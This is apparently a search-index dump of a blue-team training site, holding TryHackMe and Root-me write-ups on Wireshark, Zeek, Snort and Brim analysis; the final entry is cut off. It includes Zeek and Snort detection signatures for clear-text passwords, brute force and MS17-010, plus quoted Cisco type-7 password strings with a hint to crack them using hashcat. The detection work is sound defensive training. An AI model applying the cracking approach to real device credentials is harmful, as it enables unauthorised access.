[
  {
    "objectID": "98060f8456c237712d25de0729191511",
    "u": "https://nta.tymyrddin.dev/",
    "t": "Network traffic analysis (NTA) ",
    "c": "Network traffic analysis (NTA)  Spot and probe network anomalies using industry tools and techniques. Testlab Network traffic analysis tools TryHackMe rooms  Wireshark Introduction Nmap scans ARP poisoning & on-path Identifying hosts Tunneling traffic Clear-text protocol analysis Encrypted protocol analysis Hunt clear-text credentials Firewall rules Snort Introduction Writing IDS rules MS17-010 Log4j Brute force Reverse shell Zeek Introduction Network security monitoring Signatures Scripts Scripts and signatures Frameworks Packages Anomalous DNS Phishing Log4J Brim Introduction Use cases Malware C2 detection Crypto mining Root-me challenges Introduction FTP authentication TELNET authentication ETHERNET frame Twitter authentication Bluetooth Unknown file CISCO password DNS zone transfer IP Time To Live LDAP null bind POP-APOP SIP - authentication ETHERNET patched transmission Global system traffic for mobile communication SSL HTTP exchange Books ",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "83fa0b7fc3acbcefd9d85a0ad1ff4b17",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ethernet-patched",
    "t": "ETHERNET patched transmission ",
    "c": "ETHERNET patched transmission  root-me challenge ETHERNET - Patched transmission : These frames have been altered upon interception, find the lost information. Password’s format is 10 bytes in hexadecimal notation (i.e. 20 characters) First frame  >>> INGRESS >>> 0x0000: 0050 569e 7bf9 0050 569e 7bfb 8100 0185 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 7331 2002 c000 0203 0x0030: 0000 0000 0000 0000 dead 8000 0af0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b f9 MAC source (6 octets) 00 50 56 9e 7b fb 802.1Q TAG (VLAN) (4 octets) 81 00 01 85 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Second frame  >>> INGRESS >>> 0x0000: 0050 569e 7bf7 0050 569e 7bf9 8100 0186 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 b00b 2002 c000 0203 0x0030: 0000 0000 0000 0000 fada 8000 0af0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b f7 MAC source (6 octets) 00 50 56 9e 7b f9 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Third frame  >>> INGRESS >>> 0x0000: 0050 569e 7bfe 0050 569e 7bf7 8100 0186 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 7331 2002 c000 0203 0x0030: 0000 0000 0000 0000 b00b 8000 c760 0795 0x0040: 0001 906d a451 0000 0000 8fac 0b00 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b fe MAC source (6 octets) 00 50 56 9e 7b f7 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Fourth frame  <<< EGRESS <<< 0x0000: 0050 569e 7b?? 0050 569e 7b?? ???? 0186 0x0010: 86dd 6000 0000 0040 ??40 2002 c000 0203 0x0020: 0000 0000 0000 0000 ???? 2002 c000 0203 0x0030: 0000 0000 0000 0000 ???? ??00 09f0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b ?? MAC source (6 octets) 00 50 56 9e 7b ?? 802.1Q TAG (VLAN) (4 octets) ?? ?? 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) First and third frames have incorrect checksums, so this could be a reply to the second (on the same VLAN): Field Value MAC destination (6 octets) 00 50 56 9e 7b f9 MAC source (6 octets) 00 50 56 9e 7b f7 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Making for: Field Value Missing ICMPv6 Packet 3a 3a IPv6 source 2002 c000 0203 ... fada fada IPv6 destination 2002 c000 0203 ... b00b b00b ICMP-Type 0x81 (echo-reply) 81 0000 00 50 56 9e 7b f9 00 50 56 9e 7b f7 81 00 01 86 0010 86 dd 60 00 00 00 00 40 3a 40 20 02 c0 00 02 03 0020 00 00 00 00 00 00 00 00 fa da 20 02 c0 00 02 03 0030 00 00 00 00 00 00 00 00 b0 0b 81 00 09 f0 07 92 0040 00 01 14 6d a4 51 00 00 00 00 d0 20 03 00 00 00 0050 00 00 2d 4d 45 2e 4f 52 47 20 52 4f 4f 54 2d 4d 0060 45 2e 4f 52 47 20 52 4f 4f 54 2d 4d 45 2e 4f 52 0070 47 20 52 4f 4f 54 2d 4d 45 2e Using text2pcap , and fits! Concatenate the missing info just filled in to get the flag. Resources  Format des trames Ethernet Les réseaux Ethernet - le format des trames",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e663fa2656b63a580c77687487acdd06",
    "u": "https://nta.tymyrddin.dev/docs/zeek/and",
    "t": "Scripts and signatures ",
    "c": "Scripts and signatures  Zeek scripts can refer to signatures and other Zeek scripts. This flexibility provides a massive advantage in event correlation. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-7 Go to folder TASK-7/101 . Investigate the sample.pcap file with the 103.zeek script. Investigate the terminal output. What is the number of the detected new connections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/101$ zeek -C -r sample.pcap 103.zeek | grep \"New Connection Found\" | wc -l 87 Go to folder TASK-7/201 . Investigate the ftp.pcap file with ftp-admin.sig signature and 201.zeek script. Investigate the signatures.log file. zeek -C -r ftp.pcap -s ftp-admin.sig 201.zeek What is the number of signature hits? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat signatures.log | grep \"ftp-admin\" | wc -l 1401 Investigate the signatures.log file. What is the total number of administrator username detections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat signatures.log | grep \"administrator\" | wc -l 731 Investigate the ftp.pcap file with all local scripts, and investigate the loaded_scripts.log file. What is the total number of loaded scripts? zeek -C -r ftp.pcap local ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat loaded_scripts.log | grep \".zeek\" | wc -l 498 Go to folder TASK-7/202 . Investigate the ftp-brute.pcap file with the /opt/zeek/share/zeek/policy/protocols/ftp/detect-bruteforcing.zeek script. zeek -C -r ftp-brute.pcap /opt/zeek/share/zeek/policy/protocols/ftp/detect-bruteforcing.zeek Investigate the notice.log file. What is the total number of brute-force detections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/202$ cat notice.log | grep \"Bruteforcing\" | wc -l 2",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "38554a619075f6c97e8fdc6207d4d59a",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/readme",
    "t": "Introduction ",
    "c": "THM Room: Wireshark: Traffic Analysis Introduction  What?  Network sniffing and packet analysis with Wireshark. Why?  Analyse protocols and PCAPs. Packet analysis and finding the needle in the haystack. Traffic analysis and finding anomalies on the network. How?  Nmap scans ARP poisoning & on-path Identifying hosts Tunneling traffic Clear-text protocol analysis Encrypted protocol analysis Hunt clear-text credentials Firewall rules",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2c935e1cf55ad44a33416bde7bc160ec",
    "u": "https://nta.tymyrddin.dev/docs/zeek/signatures",
    "t": "Signatures ",
    "c": "Signatures  Zeek supports signatures to have rules and event correlations to find noteworthy activities on the network. Zeek signatures use low-level pattern matching and cover conditions similar to Snort rules. Unlike Snort rules, Zeek rules are not the primary event detection point. Zeek has a scripting language and can chain multiple events to find an event of interest. Zeek signatures are composed of three logical paths; signature id, conditions and action. Logical path Breakdown Signature id Unique signature name. Conditions Header : Filtering the packet headers for specific source and destination addresses, protocol and port numbers. Content : Filtering the packet payload for specific value/pattern. Action Default action : Create the signatures.log file in case of a signature match. Additional action : Trigger a Zeek script. The most common conditions and filters for Zeek signatures: Condition Field Available Filters Header src-ip : Source IP. dst-ip : Destination IP. src-port : Source port. dst-port : Destination port. ip-proto : Target protocol. Supported protocols; TCP, UDP, ICMP, ICMP6, IP, IP6 Content payload : Packet payload. http-request : Decoded HTTP requests. http-request-header : Client-side HTTP headers. http-request-body : Client-side HTTP request bodys. http-reply-header : Server-side HTTP headers. http-reply-body : Server-side HTTP request bodys. ftp : Command line input of FTP sessions. Context same-ip : Filtering the source and destination addresses for duplication. Action event : Signature match message. Comparison Operators ==, !=, <, <=, >, >= NOTE! Filters accept string, numeric and regex values. To run Zeek with a signature file: zeek -C -r sample.pcap -s sample.sig -C : Ignore checksum errors. -r : Read pcap file. -s : Use signature file. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-5 . HTTP  Investigate the http.pcap file. Create the HTTP signature and investigate the pcap . nano http-password.sig HTTP signature: signature http-password { ip-proto == tcp dst-port == 80 payload /.*password.*/ event \"Clear-text password found.\" } Run zeek : zeek -C -r http.pcap -s http-password.sig What is the source IP of the first event? cat signatures.log | zeek-cut src_addr 10.10.57.178 <= 10.10.57.178 What is the source port of the second event? cat signatures.log | zeek-cut src_port 38706 38712 <= Investigate the conn.log . What is the total number of the sent and received packets from source port 38706 ? cat conn.log | zeek-cut id.orig_p id.resp_h id.resp_p proto service orig_pkts orig_ip_bytes resp_pkts 38704 44.228.249.3 80 tcp - 4 216 2 38706 44.228.249.3 80 tcp http 11 1815 9 <= Total 20 38708 44.228.249.3 80 tcp - 4 216 2 38710 44.228.249.3 80 tcp - 4 216 2 38712 44.228.249.3 80 tcp http 6 1272 5 FTP  Create signature file and investigate the ftp.pcap file. signature ftp-username { ip-proto == tcp ftp /.*USER.*dmin.*/ event \"FTP Username Input Found!\" } signature ftp-brute { ip-proto == tcp payload /.*530.*Login.*incorrect.*/ event \"FTP Brute-force Attempt!\" } Run zeek : zeek -C -r ftp.pcap -s ftp-bruteforce.sig Investigate the notice.log . What is the number of unique events? Top of the file: cat notice.log | head -10 #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path notice #open 2022-11-28-21-49-01 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p fuid file_mime_type file_descproto note msg sub src dst p n peer_descr actions email_dest suppress_for remote_location.country_code remote_location.region remote_location.city remote_location.latitude remote_location.longitude #types time string addr port addr port string string string enum enum string string addr addr port count string set[enum] set[string] interval string string string double double 1024380731.015090 CCKUOW2neqARiqxzI6 10.234.125.254 2217 10.121.70.151 21 - - - tcp Signatures::Sensitive_Signature 10.121.70.151: FTP Brute-force Attempt! 530 Login incorrect.\\x0d\\x0a 10.121.70.151 10.234.125.254 21 - - Notice::ACTION_LOG (empty) 3600.000000 - - - -- 1024380731.043248 C57fWGbeB8QktlHv5 10.234.125.254 2220 10.121.70.151 21 - - - tcp Signatures::Sensitive_Signature 10.121.70.151: FTP Brute-force Attempt! 530 Login incorrect.\\x0d\\x0a 10.121.70.151 10.234.125.254 21 - - Notice::ACTION_LOG (empty) 3600.000000 - - - - And construct command: cat notice.log | zeek-cut uid | sort | uniq | wc -l 1413 What is the number of ftp-brute signature matches? cat signatures.log | grep \"ftp-brute\" | wc -l 1410",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d129f5cc719887f05df9123add73dfa4",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/encrypted",
    "t": "Encrypted protocol analysis ",
    "c": "Encrypted protocol analysis  Decrypting HTTPS Traffic  When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Knowing how to use key files to decrypt encrypted traffic and investigate the traffic activity, is a must-have skill. The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. Questions  Use the Desktop/exercise-pcaps/https/Exercise.pcap file. What is the frame number of the Client Hello message sent to accounts.google.com ? 16 Decrypt the traffic with the KeysLogFile.txt file. What is the number of HTTP2 packets? Edit -> Preferences -> Protocols -> TLS -> Browse for (Pre)-Master-Secret log filename -> KeysLogFile.txt 115 Go to Frame 322 . What is the authority header of the HTTP2 packet? (Enter the address in defanged format.) safebrowsing[.]googleapis[.]com Investigate the decrypted packets and find the flag! What is the flag? File -> Export Objects -> HTTP -> Save txt file to Desktop -> Open file.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8c8f916c39d81e097ca9234b1417c0b5",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/creds",
    "t": "Hunt clear-text credentials ",
    "c": "Hunt clear-text credentials  Wireshark is not an IDS, but it provides suggestions for some cases under the expert info. And sometimes anomalies replicate the legitimate traffic, so the detection becomes harder. For example, in a clear-text credential hunting case, it is not easy to spot the multiple credential inputs and decide if there is a brute-force attack or if it is a standard user who mistyped their credentials. As everything is presented at the packet level, it is hard to spot the multiple username/password entries at first glance. The detection time will decrease when an analyst can view the credential entries as a list. Wireshark has such a feature to help analysts who want to hunt clear-text credential entries. Some Wireshark dissectors (FTP, HTTP, IMAP, pop and SMTP) are programmed to extract clear-text passwords from the capture file. View detected credentials using the “Tools -> Credentials” menu. This feature works only after specific versions of Wireshark (v3.1 and later). Since the feature works only with particular protocols, it is suggested to have manual checks and not entirely rely on this feature to decide if there is a clear-text credential in the traffic. Questions  Use the Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap file. What is the packet number of the credentials using HTTP Basic Auth ? 237 What is the packet number where empty password was submitted? 170 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f117c6c2e8ca0d15205603923cfdb746",
    "u": "https://nta.tymyrddin.dev/docs/root-me/cisco-password",
    "t": "CISCO password ",
    "c": "CISCO password  root-me challenge CISCO - password : Find the “Enable” password. (It’s not always a hash.) Tried the enable secret. No go. $ cat ch15.txt | grep \"password 7\" username hub password 7 025017705B3907344E username admin privilege 15 password 7 10181A325528130F010D24 username guest password 7 124F163C42340B112F3830 password 7 144101205C3B29242A3B3C3927 Use the Cisco Password Cracker on those. Pattern emerges. Prepend recursively with pattern in a rule-based hashcat attack . Resources  Cisco passwords Cisco passwords encryption facts",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "268032c092b0c38cdb91119e7988baa9",
    "u": "https://nta.tymyrddin.dev/docs/snort/brute-force",
    "t": "Brute force ",
    "c": "Brute force  THE NARRATOR: J&Y Enterprise is one of the top coffee retails in the world. They are known as tech-coffee shops and serve millions of coffee lover tech geeks and IT specialists every day. They are famous for specific coffee recipes for the IT community and unique names for these products. Their top five recipe names are WannaWhite, ZeroSleep, MacDown, BerryKeep and CryptoY. J&Y’s latest recipe, “Shot4J”, attracted great attention at the global coffee festival. J&Y officials promised that the product will hit the stores in the coming months. The super-secret of this recipe is hidden in a digital safe. Attackers are after this recipe, and J&Y enterprises are having difficulties protecting their digital assets. Last week, they received multiple attacks and decided to work with you to help them improve their security level and protect their recipe secrets. This is your assistant, J.A.V.A. (Just Another Virtual Assistant). She is an AI-driven virtual assistant and will help you notice possible anomalies. Hey, wait, something is happening… J.A.V.A.: Welcome, sir. I am sorry for the interruption. It is an emergency. Somebody is knocking on the door! YOU: Knocking on the door? What do you mean by “knocking on the door”? J.A.V.A.: We have a brute-force attack, sir. THE NARRATOR: This is not a comic book! Would you mind going and checking what’s going on! Please… J.A.V.A.: Sir, you need to observe the traffic with Snort and identify the anomaly first. Then you can create a rule to stop the brute-force attack. GOOD LUCK! Start in sniffer mode and capture some data: sudo snort -dev -l . Investigate with the logfile just created: sudo snort -r snort.log.1669600005 Most packets are sent to port 80 and 22: sudo snort -r snort.log. 'port 80' -n 10 This traffic appears to be normal browsing traffic. sudo snort -r snort.log. 'port 22' -n 10 ... WARNING: No preprocessors configured for policy 0. 11/28-01:46:45.872757 10.10.245.36:46862 -> 10.10.140.29:22 TCP TTL:64 TOS:0x0 ID:64426 IpLen:20 DgmLen:68 DF ***AP*** Seq: 0x8B1F1461 Ack: 0xA4DD5677 Win: 0x1E1 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1884616219 4119723644 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 11/28-01:46:45.872773 10.10.140.29:22 -> 10.10.245.36:46862 TCP TTL:64 TOS:0x0 ID:29890 IpLen:20 DgmLen:52 DF ***A**** Seq: 0xA4DD5677 Ack: 0x8B1F1471 Win: 0x1E3 TcpLen: 32 TCP Options (3) => NOP NOP TS: 4119723645 1884616219 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ This traffic indicates a possible brute-force attack on tcp port 22 (ssh). sudo nano /etc/snort/rules/local.rules Create a rule: # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. drop tcp any 22 <> any any (msg: \"Brute Force Detected\"; sid: 100001; rev:1;) Start snort in IPS mode: sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full And flag!",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8e62d4a5c8c88f83a72b9d972676ab81",
    "u": "https://nta.tymyrddin.dev/docs/zeek/packages",
    "t": "Packages ",
    "c": "Packages  Zeek Package Manager helps users install third-party scripts and plugins to extend Zeek functionalities with ease. The package manager is installed with Zeek and available with the zkg command. Users can install, load, remove, update and create packages with the zkg tool. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-9 Investigate the http.pcap file with the zeek-sniffpass module. zeek -Cr http.pcap /opt/zeek/share/zeek/site/zeek-sniffpass Investigate the notice.log file. Which username has more module hits? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/cleartext-pass$ cat notice.log | zeek-cut msg Password found for user BroZeek Password found for user BroZeek Password found for user BroZeek Password found for user ZeekBro Password found for user ZeekBro Investigate the case2.pcap file with geoip-conn module. zeek -Cr case2.pcap /opt/zeek/share/zeek/site/geoip-conn Investigate the conn.log file . What is the name of the identified City? Which IP address is associated with the identified City? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ cat conn.log | zeek-cut geo.resp.city Chicago ... ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ cat conn.log | zeek-cut geo.resp.city id.resp_h 23.77.86.54 ... Investigate the case2.pcap file with sumstats-counttable.zeek script. How many types of status codes are there in the given traffic capture? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ zeek -Cr case2.pcap sumstats-counttable.zeek Host: 23.77.86.54 status code: 301, count: 4 Host: 116.203.71.114 status code: 302, count: 4 status code: 404, count: 6 status code: 301, count: 4 status code: 200, count: 26 Resources  Zeek Package Browser zeek/packages",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2228fb63696c49d07645f1dda5c69aa2",
    "u": "https://nta.tymyrddin.dev/docs/snort/readme",
    "t": "Introduction ",
    "c": "THM Rooms: Snort-Challenge The Basics and Live Attacks Introduction  What?  Intrusion detection and prevention with Snort. Why?  Detect real-time threats, analyse recorded traffic files and identify anomalies. Write snort rules to analyse live capture network traffic. Defend against a live attack How?  Writing IDS rules MS17-010 Log4j Brute force Reverse shell",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8d6dccc1f713a2cbb285c5ee9c9a99c8",
    "u": "https://nta.tymyrddin.dev/docs/zeek/monitoring",
    "t": "Network security monitoring ",
    "c": "Network security monitoring  Network monitoring is a set of management actions to watch/continuously overview and optionally save the network traffic for further investigation. This action aims to detect and reduce network problems, improve performance, and in some cases, increase overall productivity. It is a main part of the daily IT/SOC operations and differs from Network Security Monitoring (NSM) in its purpose. Network monitoring  Network monitoring is highly focused on IT assets like uptime (availability), device health and connection quality (performance), and network traffic balance and management (configuration). Monitoring and visualising the network traffic, troubleshooting, and root cause analysis are also part of the Network Monitoring process. This model is helpful for network administrators and usually doesn’t cover identifying non-asset in-depth vulnerabilities and significant security concerns like internal threats and zero-day vulnerabilities. Usually, Network Monitoring is not within the SOC scope. It is linked to the enterprise IT/Network management team. Network security monitoring  Network Security Monitoring is focused on network anomalies like rogue hosts, encrypted traffic, suspicious service and port usage, and malicious/suspicious traffic patterns in an intrusion/anomaly detection and response approach. Monitoring and visualising the network traffic and investigating suspicious events is a core part of Network Security Monitoring. This model is helpful for security analysts/incident responders, security engineers and threat hunters and covers identifying threats, vulnerabilities and security issues with a set of rules, signatures and patterns. Network Security Monitoring is part of the SOC, and the actions are separated between tier 1-2-3 analyst levels.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a00d0ad5ed4882d7280bab1945773a4b",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ip-ttl",
    "t": "IP Time To Live ",
    "c": "IP Time To Live  root-me challenge IP - Time To Live : Find the TTL used to reach the targeted host in this ICMP exchange. (Packet capture analysis). Find the first request that has a reply (that one didn’t exceed the TTL). Find TTL in Internet Protocol Version 4 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "458e570d504fd11ef1335e3dda0ae992",
    "u": "https://nta.tymyrddin.dev/docs/brim/mining",
    "t": "Crypto mining ",
    "c": "Crypto mining  Cryptocurrencies are frequently on the agenda with their constantly rising value and legal aspect. The ability to obtain cryptocurrencies by mining is becoming one of the biggest problems in today’s corporate environments. Attackers not only compromise the systems and ask for a ransom, but sometimes they also install mining tools (crypto-jacking). Other than the attackers and threat actors, sometimes internal threats and misuse of trust and privileges end up installing coin miners in the corporate environment. Usually, mining cases are slightly different from traditional compromising activities. Internal attacks do not typically contain major malware samples. This does not mean they are not malicious as they are exploiting essential resources like computing power, internet, and electricity. And crypto mining activities require third party applications and tool installations which could be vulnerable or create backdoors. Lastly, mining activities are causing network performance and stability problems. Coin mining is becoming one of the common use cases of threat hunters. Questions  How many connections used port 19999? _path==\"conn\" | 19999 | count() 22 What is the name of the service used by port 6666? _path==\"conn\" | 6666 | cut service irc What is the amount of transferred total bytes to 101.201.172.235:8888 ? _path==\"conn\" | 101.201.172.235 | 8888 3,729 What is the detected MITRE tactic id? event_type==\"alert\" TA0040 Done.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2dd81ea476b95d9299d647cfe29ede61",
    "u": "https://nta.tymyrddin.dev/docs/brim/use-cases",
    "t": "Use cases ",
    "c": "Use cases  It is highly suggested to use field names and filtering options and not rely on the blind/irregular search function. Brim provides great indexing of log sources, but it is not performing well in irregular search queries. The best practice is always to use the field filters to search for the event of interest. Filter Communicated Hosts Identifying the list of communicated hosts is the first step of the investigation. Security analysts need to know which hosts are actively communicating on the network to detect any suspicious and abnormal activity in the first place. This approach will help analysts to detect possible access violations, exploitation attempts and malware infections. Query : _path==\"conn\" | cut id.orig_h, id.resp_h | sort | uniq Frequently Communicated Hosts After having the list of communicated hosts, it is important to identify which hosts communicate with each other most frequently. This will help security analysts to detect possible data exfiltration, exploitation and backdooring activities. Query : _path==\"conn\" | cut id.orig_h, id.resp_h | sort | uniq -c | sort -r Most Active Ports Suspicious activities are not always detectable in the first place. Attackers use multiple ways of hiding and bypassing methods to avoid detection. However, since the data is evidence, it is impossible to hide the packet traces. Investigating the most active ports will help analysts to detect silent and well-hidden anomalies by focusing on the data bus and used services. Query : _path==\"conn\" | cut id.resp_p, service | sort | uniq -c | sort -r count Query : _path==\"conn\" | cut id.orig_h, id.resp_h, id.resp_p, service | sort id.resp_p | uniq -c | sort -r Long Connections For security analysts, the long connections could be the first anomaly indicator. If the client is not designed to serve a continuous service, investigating the connection duration between two IP addresses can reveal possible anomalies like backdoors. Query : _path==\"conn\" | cut id.orig_h, id.resp_p, id.resp_h, duration | sort -r duration Transferred Data Another essential point is calculating the transferred data size. If the client is not designed to serve and receive files and act as a file server, it is important to investigate the total bytes for each connection. Thus, analysts can distinguish possible data exfiltration or suspicious file actions like malware downloading and spreading. Query : _path==\"conn\" | put total_bytes := orig_bytes + resp_bytes | sort -r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytes DNS and HTTP Queries Identifying suspicious and out of ordinary domain connections and requests is another significant point for a security analyst. Abnormal connections can help detect C2 communications and possible compromised/infected hosts. Identifying the suspicious DNS queries and HTTP requests help security analysts to detect malware C2 channels and support the investigation hypothesis. Query : _path==\"dns\" | count () by query | sort -r Query : _path==\"http\" | count () by uri | sort -r Suspicious Hostnames Identifying suspicious and out of ordinary hostnames helps analysts to detect rogue hosts. Investigating the DHCP logs provides the hostname and domain information. Query : _path==\"dhcp\" | cut host_name, domain Suspicious IP Addresses For security analysts, identifying suspicious and out of ordinary IP addresses is as essential as identifying weird domain addresses. Since the connection logs are stored in one single log file (conn), filtering IP addresses is more manageable and provides more reliable results. Query : _path==\"conn\" | put classnet := network_of(id.resp_h) | cut classnet | count() by classnet | sort -r Detect Files Investigating transferred files is another important point of traffic investigation. Performing this hunt will help security analysts to detect the transfer of malware or infected files by correlating the hash values. This act is also valuable for detecting transferring of sensitive files. Query : filename!=null SMB Activity Another significant point is investigating the SMB activity. This will help analysts to detect possible malicious activities like exploitation, lateral movement and malicious file sharing. When running an investigation, it is suggested to ask, \"What is going on in SMB?\" Query : _path==\"dce_rpc\" OR _path==\"smb_mapping\" OR _path==\"smb_files\" Known Patterns Known patterns represent alerts generated by security solutions. These alerts are generated against the common attack/threat/malware patterns and known by endpoint security products, firewalls and IDS/IPS solutions. This data source highly relies on available signatures, attacks and anomaly patterns. Investigating available log sources containing alerts is vital for a security analyst. Brim supports the Zeek and Suricata logs, so any anomaly detected by these products will create a log file. Investigating these log files can provide a clue where the analyst should focus. Query : event_type==\"alert\" or _path==\"notice\" or _path==\"signatures\"",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "bf3c2c54c61c1d5d92220ea443ec3a64",
    "u": "https://nta.tymyrddin.dev/docs/snort/ms17-010",
    "t": "MS17-010 ",
    "c": "MS17-010  local-1.rules # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 445 (msg: \"Exploit Detected!\"; content: \"IPC$\"; sid: 100001; rev:1;) Run snort: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local-1.rules -dev -l . -r ms-17-010.pcap ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -d -r snort.log.1669590408 Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669590408\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=3117) WARNING: No preprocessors configured for policy 0. 05/18-08:12:07.219861 192.168.116.149:49368 -> 192.168.116.138:445 TCP TTL:128 TOS:0x0 ID:575 IpLen:20 DgmLen:117 DF ***AP*** Seq: 0xFF7320A3 Ack: 0x223125FA Win: 0xFF TcpLen: 20 00 00 00 49 FF 53 4D 42 75 00 00 00 00 18 01 20 ...I.SMBu...... 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B ............../K 00 08 C5 5E 04 FF 00 00 00 00 00 01 00 1C 00 00 ...^............ 5C 5C 31 39 32 2E 31 36 38 2E 31 31 36 2E 31 33 \\\\192.168.116.13 38 5C 49 50 43 24 00 3F 3F 3F 3F 3F 00 8\\IPC$.?????. =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "95ef13b73b6026e8683d6cda414cfe50",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/nmap",
    "t": "Nmap scans ",
